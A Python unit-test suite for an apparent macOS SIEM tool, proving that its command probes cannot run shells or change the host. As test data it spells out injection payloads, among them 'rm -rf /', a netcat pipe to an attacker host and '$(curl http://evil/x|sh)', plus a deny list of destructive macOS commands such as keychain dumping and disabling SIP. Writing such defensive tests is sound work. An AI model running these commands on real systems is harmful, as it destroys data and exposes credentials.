"""The safety suite.  If this fails, nothing else matters.

The input to this entire project is a catalogue of macOS attack commands, so
"we validated the argv" is not enough on its own.  These tests assert the
invariants that make it impossible for MacSIEM to change the host it monitors.
"""

from __future__ import annotations

import ast
import copy
import json
import os
import unittest

from macsiem.evidence import probes as probes_mod, safety
from macsiem.rules import loader

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PACKAGE = os.path.join(ROOT, "macsiem")

BANNED_CALLS = {"system", "popen", "execv", "execve", "execl", "execlp", "execvp",
                "spawnl", "spawnv", "eval", "exec", "compile"}
BANNED_MODULES = {"pty", "commands"}
#: subprocess may be imported here and nowhere else.
SUBPROCESS_ALLOWED = {os.path.join(PACKAGE, "util", "proc.py")}


def python_files():
    for base, _dirs, files in os.walk(PACKAGE):
        for name in files:
            if name.endswith(".py"):
                yield os.path.join(base, name)


class TestNoShellExecution(unittest.TestCase):
    def test_no_shell_true_anywhere(self):
        """AST-based, not textual: prose about shell=True is fine, using it is not."""
        for path in python_files():
            with open(path, "r") as handle:
                tree = ast.parse(handle.read(), filename=path)
            for node in ast.walk(tree):
                if not isinstance(node, ast.Call):
                    continue
                for keyword in node.keywords:
                    if keyword.arg == "shell":
                        value = getattr(keyword.value, "value", None)
                        self.assertFalse(
                            bool(value),
                            "%s:%d passes shell=%r" % (os.path.relpath(path, ROOT),
                                                       node.lineno, value))

    def test_subprocess_only_in_the_runner(self):
        for path in python_files():
            with open(path, "r") as handle:
                tree = ast.parse(handle.read(), filename=path)
            for node in ast.walk(tree):
                imported = []
                if isinstance(node, ast.Import):
                    imported = [alias.name.split(".")[0] for alias in node.names]
                elif isinstance(node, ast.ImportFrom) and node.module:
                    imported = [node.module.split(".")[0]]
                if "subprocess" in imported and path not in SUBPROCESS_ALLOWED:
                    self.fail("%s imports subprocess; only util/proc.py may"
                              % os.path.relpath(path, ROOT))

    def test_no_dangerous_builtins(self):
        for path in python_files():
            with open(path, "r") as handle:
                tree = ast.parse(handle.read(), filename=path)
            for node in ast.walk(tree):
                if isinstance(node, ast.Call):
                    name = None
                    if isinstance(node.func, ast.Name):
                        name = node.func.id
                    elif isinstance(node.func, ast.Attribute):
                        name = node.func.attr
                    if name in BANNED_CALLS and name not in ("compile",):
                        # `os.popen`, `eval`, `exec`, `os.system` and friends.
                        self.fail("%s:%d calls %s()" % (
                            os.path.relpath(path, ROOT), node.lineno, name))
                if isinstance(node, ast.Import):
                    for alias in node.names:
                        self.assertNotIn(alias.name.split(".")[0], BANNED_MODULES,
                                         "%s imports %s" % (path, alias.name))


class TestProbeCatalog(unittest.TestCase):
    def test_every_probe_validates(self):
        report = safety.self_audit(probes_mod.CATALOG)
        self.assertTrue(report["ok"], "\n".join(report["failures"]))

    def test_probe_ids_unique(self):
        ids = [probe.id for probe in probes_mod.CATALOG]
        self.assertEqual(len(ids), len(set(ids)))

    def test_only_one_probe_may_write(self):
        writers = [p.id for p in probes_mod.CATALOG if p.writes_artifact]
        self.assertEqual(writers, ["content.screenshot"],
                         "a new writing probe was added; it needs review")

    def test_declared_exceptions_are_real(self):
        """Every exempt string must actually appear in the probe claiming it.

        This is what stops the exemption list in safety.py from drifting away
        from the catalog and silently widening.
        """
        for probe_id, (_validator, values) in safety._EXEMPT_ELEMENTS.items():
            probe = probes_mod.BY_ID[probe_id]
            for value in values:
                self.assertIn(value, probe.argv,
                              "%s claims an exemption for a string it does not use"
                              % probe_id)
            self.assertTrue(probe.exception,
                            "%s has an exemption but no written justification"
                            % probe_id)

    def test_native_probes_declare_a_known_handler(self):
        from macsiem.evidence import native
        for probe in probes_mod.CATALOG:
            if probe.kind == "native":
                self.assertIn(probe.native, native.HANDLERS, probe.id)


class TestGuardRejectsMutation(unittest.TestCase):
    """Mutation testing: prove the guard rejects, rather than trusting it."""

    MUTATIONS = [
        ("append destructive verb", lambda a: a + ["disable"]),
        ("swap subcommand for erase", lambda a: [a[0], "erase"] + a[2:]),
        ("inject a semicolon", lambda a: a + ["; rm -rf /"]),
        ("inject command substitution", lambda a: a + ["$(whoami)"]),
        ("inject a pipe", lambda a: a + ["| nc attacker 443"]),
        ("inject a backtick", lambda a: a + ["`id`"]),
        ("inject a newline", lambda a: a + ["x\nlog erase --all"]),
        ("repoint argv[0] into /tmp", lambda a: ["/tmp/evil"] + a[1:]),
        ("add an output redirect", lambda a: a + [">", "/tmp/out"]),
        ("add --force", lambda a: a + ["--force"]),
        ("make argv[0] relative", lambda a: [a[0].rsplit("/", 1)[-1]] + a[1:]),
        ("replace with tccutil reset", lambda a: ["/usr/bin/tccutil", "reset", "All"]),
        ("replace with spctl --master-disable",
         lambda a: ["/usr/sbin/spctl", "--master-disable"]),
        ("strip quarantine",
         lambda a: ["/usr/bin/xattr", "-d", "com.apple.quarantine", "/tmp/x"]),
        ("poison the log predicate", lambda a: a[:-1] + ["$(curl http://evil/x|sh)"]),
        ("point the artifact at /etc/passwd",
         lambda a: a[:-1] + ["/etc/passwd"] if a[-1] == "{artifact}" else a + ["; :"]),
    ]

    def test_kill_rate_is_total(self):
        escapes = []
        total = 0
        for probe in [p for p in probes_mod.CATALOG if p.kind == "exec"]:
            for label, mutate in self.MUTATIONS:
                mutant = copy.copy(probe)
                mutant.argv = mutate(list(probe.argv))
                total += 1
                try:
                    safety.validate_probe(mutant)
                    escapes.append("%s / %s -> %s" % (probe.id, label,
                                                      " ".join(mutant.argv)))
                except safety.UnsafeProbe:
                    pass
        self.assertEqual(escapes, [],
                         "%d of %d mutations escaped the guard" % (len(escapes), total))
        self.assertGreater(total, 500)

    def test_runtime_argv_containment(self):
        probe = probes_mod.BY_ID["content.screenshot"]
        bundle = "/var/db/macsiem/bundles/b1"
        inside = [e.replace("{artifact}", bundle + "/shot.png") for e in probe.argv]
        self.assertTrue(safety.validate_runtime_argv(probe, inside, bundle))
        for escape in ("/etc/passwd", bundle + "/../../../etc/x", "/tmp/x.png"):
            argv = [e.replace("{artifact}", escape) for e in probe.argv]
            with self.assertRaises(safety.UnsafeProbe):
                safety.validate_runtime_argv(probe, argv, bundle)

    def test_runtime_argv_rejects_length_changes(self):
        probe = probes_mod.BY_ID["posture.sip"]
        with self.assertRaises(safety.UnsafeProbe):
            safety.validate_runtime_argv(probe, probe.argv + ["disable"])
        with self.assertRaises(safety.UnsafeProbe):
            safety.validate_runtime_argv(probe, ["/tmp/x"] + probe.argv[1:])


class TestCorpusFirewall(unittest.TestCase):
    """LOOBins `code` strings are detection data.  They must never be runnable."""

    def test_rulepack_has_no_command_strings(self):
        with open(loader.DATA_PATH, "r") as handle:
            rulepack = json.load(handle)
        blob = json.dumps(rulepack)
        for key in ("\"code\":", "\"cmd\":", "\"command\":", "\"script\":"):
            self.assertNotIn(key, blob,
                             "the rulepack carries an executable string field")
        for rule in rulepack["rules"]:
            self.assertNotIn("code", rule)

    def test_no_corpus_command_appears_in_any_probe(self):
        """The strongest form: no probe argv reproduces a corpus command."""
        with open(loader.DATA_PATH, "r") as handle:
            rulepack = json.load(handle)
        catalog_text = " ".join(" ".join(p.argv) for p in probes_mod.CATALOG
                                if p.kind == "exec")
        destructive = ["log erase", "csrutil disable", "spctl --master-disable",
                       "tccutil reset", "sfltool resetbtm", "lsregister -delete",
                       "tmutil delete", "dump-keychain", "add-trusted-cert",
                       "-setwebproxy", "pkill", "sysadminctl -addUser"]
        for fragment in destructive:
            self.assertNotIn(fragment, catalog_text,
                             "a probe would run %r" % fragment)
        self.assertGreater(len(rulepack["rules"]), 200)


if __name__ == "__main__":
    unittest.main()
